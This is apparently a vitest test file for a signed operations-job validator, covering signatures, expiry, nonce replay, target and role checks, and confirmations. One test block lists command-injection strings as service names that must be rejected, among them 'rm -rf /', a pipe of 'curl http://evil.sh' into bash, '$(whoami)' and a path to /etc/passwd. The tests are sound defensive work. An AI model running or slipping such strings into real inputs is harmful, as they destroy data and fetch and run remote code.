import { describe, expect, it } from 'vitest';
import { createNonceStore } from '../replay.js';
import { sign } from '../signature.js';
import { MAX_JOB_TTL_MS, verifyJob } from '../validate.js';
import { KEY, NOW, OPERATOR, OTHER_KEY, TARGETS, makeConfirmation, makeJob, signJob } from './helpers.js';

const base = { keys: [KEY], targets: TARGETS, now: NOW };

function verifyWrite(job = makeJob(), confirmations = [makeConfirmation(job)]) {
  return verifyJob({ ...base, envelope: signJob(job), confirmations });
}

describe('signature enforcement', () => {
  it('rejects a job signed with the wrong secret', () => {
    const job = makeJob();
    expect(verifyJob({ ...base, envelope: signJob(job, OTHER_KEY), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'SIGNATURE_INVALID' });
  });
});

describe('freshness', () => {
  it('accepts a job inside its window', () => {
    expect(verifyWrite().ok).toBe(true);
  });

  it('rejects a stale job', () => {
    const job = makeJob();
    const result = verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)], now: NOW + 11 * 60 * 1000 });
    expect(result).toMatchObject({ ok: false, code: 'JOB_EXPIRED' });
  });

  it('rejects a job issued in the future', () => {
    const job = makeJob({ issuedAt: new Date(NOW + 10 * 60 * 1000).toISOString(), expiresAt: new Date(NOW + 12 * 60 * 1000).toISOString() });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'JOB_NOT_YET_VALID' });
  });

  it('rejects a job whose lifetime exceeds ten minutes', () => {
    const job = makeJob({ expiresAt: new Date(NOW + MAX_JOB_TTL_MS + 1000).toISOString() });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'JOB_TTL_TOO_LONG' });
  });
});

describe('replay', () => {
  it('rejects a nonce that has already been accepted', () => {
    const nonces = createNonceStore(() => NOW);
    const job = makeJob();
    const args = { ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)], nonces };
    expect(verifyJob(args).ok).toBe(true);
    expect(verifyJob(args)).toMatchObject({ ok: false, code: 'NONCE_REPLAYED' });
  });

  it('does not burn the nonce when the job is rejected for another reason', () => {
    const nonces = createNonceStore(() => NOW);
    const rejected = makeJob({ actionProfile: 'restart', args: { service: 'worker' } });
    expect(verifyJob({ ...base, envelope: signJob(rejected), confirmations: [], nonces }))
      .toMatchObject({ ok: false, code: 'CONFIRMATION_REQUIRED' });
    expect(verifyJob({ ...base, envelope: signJob(rejected), confirmations: [makeConfirmation(rejected)], nonces }).ok).toBe(true);
  });
});

describe('targets and profiles', () => {
  it('rejects an unknown target alias', () => {
    const job = makeJob({ target: 'not-a-real-host' });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'TARGET_UNKNOWN' });
  });

  it('rejects an unknown action profile', () => {
    const job = makeJob({ actionProfile: 'rm-rf', args: {} });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'PROFILE_UNKNOWN' });
  });

  it('rejects a profile the target does not allow', () => {
    const job = makeJob({ target: 'wise2-dev', environment: 'staging', actionProfile: 'deploy', args: { app: 'website', releaseId: 'abc1234' } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'PROFILE_NOT_ALLOWED_ON_TARGET' });
  });

  it('rejects an environment that disagrees with the registry', () => {
    const job = makeJob({ target: 'wise2-dev', environment: 'production', actionProfile: 'status', args: {} });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'ENVIRONMENT_MISMATCH' });
  });
});

describe('authorization', () => {
  it('allows an operator to read', () => {
    const job = makeJob({ actor: OPERATOR, actionProfile: 'status', args: {} });
    expect(verifyJob({ ...base, envelope: signJob(job) }).ok).toBe(true);
  });

  it('refuses an operator a write profile', () => {
    const job = makeJob({ actor: OPERATOR, actionProfile: 'restart', args: { service: 'worker' } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'ROLE_DENIED' });
  });

  it('refuses a confirmation issued by a different actor', () => {
    const job = makeJob();
    const confirmation = makeConfirmation(job, { confirmedBy: { ...OPERATOR, role: 'owner' } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [confirmation] }))
      .toMatchObject({ ok: false, code: 'CONFIRMATION_ACTOR_MISMATCH' });
  });
});

describe('arguments carry no shell surface', () => {
  it.each([
    'worker; rm -rf /',
    'worker && curl http://evil.sh | bash',
    '$(whoami)',
    '../../etc/passwd',
    'worker\nrestart api',
  ])('rejects %j as a service name', (service) => {
    const job = makeJob({ args: { service } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'ARG_INVALID' });
  });

  it('rejects an argument the profile does not declare', () => {
    const job = makeJob({ args: { service: 'worker', flags: '--force' } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'ARG_UNKNOWN' });
  });

  it('rejects a missing required argument', () => {
    const job = makeJob({ args: {} });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'ARG_MISSING' });
  });

  it('rejects a diagnostic profile outside the predefined set', () => {
    const job = makeJob({ actionProfile: 'diagnose', args: { profile: 'shell' } });
    expect(verifyJob({ ...base, envelope: signJob(job) })).toMatchObject({ ok: false, code: 'ARG_INVALID' });
  });
});

describe('confirmation', () => {
  it('requires a confirmation for a write', () => {
    expect(verifyJob({ ...base, envelope: signJob(makeJob()), confirmations: [] }))
      .toMatchObject({ ok: false, code: 'CONFIRMATION_REQUIRED' });
  });

  it('requires no confirmation for a read', () => {
    const job = makeJob({ actionProfile: 'status', args: {} });
    expect(verifyJob({ ...base, envelope: signJob(job) }).ok).toBe(true);
  });

  it('requires the production environment to be echoed back', () => {
    const job = makeJob();
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job, { environmentEcho: undefined })] }))
      .toMatchObject({ ok: false, code: 'ENVIRONMENT_CONFIRMATION_REQUIRED' });
  });

  it('rejects a confirmation bound to a different job', () => {
    const job = makeJob();
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job, { jobId: 'OPS-20260905-ZZZZ' })] }))
      .toMatchObject({ ok: false, code: 'CONFIRMATION_MISMATCH' });
  });

  it('rejects an expired confirmation', () => {
    const job = makeJob({ issuedAt: new Date(NOW + 20 * 60 * 1000).toISOString(), expiresAt: new Date(NOW + 25 * 60 * 1000).toISOString() });
    const result = verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)], now: NOW + 22 * 60 * 1000 });
    expect(result).toMatchObject({ ok: false, code: 'CONFIRMATION_EXPIRED' });
  });

  it('rejects an unsigned or forged confirmation', () => {
    const job = makeJob();
    const forged = sign({ ...makeConfirmation(job).payload }, OTHER_KEY);
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [forged] }))
      .toMatchObject({ ok: false, code: 'SIGNATURE_INVALID' });
  });

  it('requires two distinct confirmations for emergency-stop', () => {
    const job = makeJob({ actionProfile: 'emergency-stop', args: { service: 'studio' } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'CONFIRMATION_REQUIRED' });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job), makeConfirmation(job, { sequence: 2 })] }).ok).toBe(true);
  });

  it('does not count the same confirmation twice', () => {
    const job = makeJob({ actionProfile: 'emergency-stop', args: { service: 'studio' } });
    expect(verifyJob({ ...base, envelope: signJob(job), confirmations: [makeConfirmation(job), makeConfirmation(job)] }))
      .toMatchObject({ ok: false, code: 'CONFIRMATION_MISMATCH' });
  });
});

describe('structure', () => {
  it.each([
    ['job id', { jobId: 'restart-worker' }],
    ['actor id', { actor: { id: 'daniel', displayName: 'Daniel', role: 'owner' } }],
    ['role', { actor: { id: '123456789012345678', displayName: 'Daniel', role: 'root' } }],
    ['environment', { environment: 'prod' }],
    ['nonce', { nonce: 'x' }],
    ['timestamps', { issuedAt: 'yesterday' }],
  ])('rejects a job with an invalid %s', (_label, patch) => {
    const job = { ...makeJob(), ...(patch as object) };
    expect(verifyJob({ ...base, envelope: sign(job, KEY) as never, confirmations: [] }))
      .toMatchObject({ ok: false, code: 'MALFORMED_JOB' });
  });
});
